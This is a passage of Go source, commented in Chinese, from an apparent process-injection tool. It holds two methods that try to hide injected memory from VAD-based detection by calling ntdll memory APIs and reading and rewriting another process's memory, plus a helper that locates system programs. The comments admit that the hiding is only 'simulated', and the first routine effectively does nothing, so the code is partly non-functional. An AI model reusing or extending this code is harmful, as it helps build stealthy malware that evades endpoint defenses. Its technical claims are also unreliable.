func (i *Injector) vadManipulation(processHandle windows.Handle, memoryAddress uintptr) error {
	fmt.Printf("执行VAD操作，隐藏内存区域...\n")

	// 该功能需要内核级别访问权限才能直接修改VAD树
	// 在用户模式下，我们只能模拟某些行为

	// 实际VAD操作需要:
	// 1. 找到指定内存地址的VAD节点
	// 2. 修改节点的属性，例如内存类型、保护级别等
	// 3. 可能还需要修改链接信息以隐藏节点

	// 模拟VAD操作的一种方法是使用VirtualProtect修改内存属性
	// 但不影响实际的内存使用

	// 获取NtQueryVirtualMemory和NtAllocateVirtualMemory函数
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryVirtualMemory := ntdll.NewProc("NtQueryVirtualMemory")

	// 内存信息结构
	type MEMORY_BASIC_INFORMATION struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionId       uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	// 查询内存信息
	var memInfo MEMORY_BASIC_INFORMATION
	r1, _, _ := ntQueryVirtualMemory.Call(
		uintptr(processHandle),
		memoryAddress,
		0, // MemoryBasicInformation
		uintptr(unsafe.Pointer(&memInfo)),
		unsafe.Sizeof(memInfo),
		0,
	)

	if r1 != 0 {
		return fmt.Errorf("查询内存信息失败: 0x%X", r1)
	}

	// 内存属性常量
	const (
		MEM_PRIVATE    = 0x20000
		PAGE_NOACCESS  = 0x01
		PAGE_READWRITE = 0x04
	)

	// 模拟VAD操作，将内存标记为私有且可读写但实际上不修改现有代码
	// 在真实的VAD操作中，会直接修改内核VAD树的节点
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	size := memInfo.RegionSize
	baseAddr := memInfo.BaseAddress
	var oldProtect uint32

	// 先记录当前保护属性
	r1, _, _ = ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(memInfo.Protect), // 保持现有保护属性
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 != 0 {
		return fmt.Errorf("设置内存保护属性失败: 0x%X", r1)
	}

	fmt.Printf("已完成VAD操作模拟\n")
	return nil
}

// removeVADNode 从VAD树中移除节点
func (i *Injector) removeVADNode(processHandle windows.Handle, memoryAddress uintptr) error {
	fmt.Printf("执行VAD节点移除操作...\n")

	// 该功能需要内核级别访问权限才能修改VAD树结构
	// 从用户模式下，我们无法真正移除VAD节点，只能模拟某些效果

	// 在真实实现中，需要:
	// 1. 定位VAD节点
	// 2. 修改链表/树结构，移除该节点
	// 3. 正确处理内存管理以避免泄漏

	// 对于模拟效果，我们可以尝试将内存标记为特殊状态
	// 使其在某些查询中不可见

	// 获取内存信息
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryVirtualMemory := ntdll.NewProc("NtQueryVirtualMemory")

	type MEMORY_BASIC_INFORMATION struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionId       uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var memInfo MEMORY_BASIC_INFORMATION
	r1, _, _ := ntQueryVirtualMemory.Call(
		uintptr(processHandle),
		memoryAddress,
		0, // MemoryBasicInformation
		uintptr(unsafe.Pointer(&memInfo)),
		unsafe.Sizeof(memInfo),
		0,
	)

	if r1 != 0 {
		return fmt.Errorf("查询内存信息失败: 0x%X", r1)
	}

	// 内存操作常量
	const (
		MEM_COMMIT    = 0x1000
		MEM_RESERVE   = 0x2000
		MEM_DECOMMIT  = 0x4000
		PAGE_NOACCESS = 0x01
	)

	// 模拟VAD节点移除
	// 实际我们只能先解除内存提交，然后重新提交
	// 这会创建一个新的VAD节点，但原始数据会丢失
	// 所以只在实验环境使用，不适合生产

	// 先保存内存内容
	size := memInfo.RegionSize
	buffer := make([]byte, size)
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, memInfo.BaseAddress, &buffer[0], size, &bytesRead)
	if err != nil {
		return fmt.Errorf("读取内存数据失败: %v", err)
	}

	// 解除内存提交
	ntVirtualFreeEx := ntdll.NewProc("NtFreeVirtualMemory")
	tempAddr := memInfo.BaseAddress
	tempSize := uintptr(0) // 将由函数填充

	r1, _, _ = ntVirtualFreeEx.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&tempAddr)),
		uintptr(unsafe.Pointer(&tempSize)),
		uintptr(MEM_DECOMMIT),
	)

	if r1 != 0 {
		return fmt.Errorf("解除内存提交失败: 0x%X", r1)
	}

	// 重新分配和提交内存
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	allocAddr := memInfo.BaseAddress
	allocSize := size

	r1, _, _ = ntAllocateVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&allocSize)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(memInfo.Protect),
	)

	if r1 != 0 {
		return fmt.Errorf("重新分配内存失败: 0x%X", r1)
	}

	// 恢复数据
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, allocAddr, unsafe.Pointer(&buffer[0]),
		size, &bytesWritten)
	if err != nil {
		return fmt.Errorf("恢复内存数据失败: %v", err)
	}

	fmt.Printf("已完成VAD节点移除模拟\n")
	return nil
}

// getSystemProgramPath 获取系统程序的路径
func getSystemProgramPath(programName string) (string, error) {
	// 获取系统目录
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	getSystemDirectoryW := kernel32.NewProc("GetSystemDirectoryW")

	var buffer [windows.MAX_PATH]uint16

	// 调用GetSystemDirectoryW获取系统目录
	ret, _, _ := getSystemDirectoryW.Call(
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
	)

	if ret == 0 {
		return "", fmt.Errorf("获取系统目录失败")
	}

	// 转换路径
	sysDir := windows.UTF16ToString(buffer[:])
	fullPath := sysDir + "\\" + programName

	// 检查文件是否存在
	_, err := os.Stat(fullPath)
	if err != nil {
		return "", fmt.Errorf("系统程序不存在: %v", err)
	}

	return fullPath, nil
}
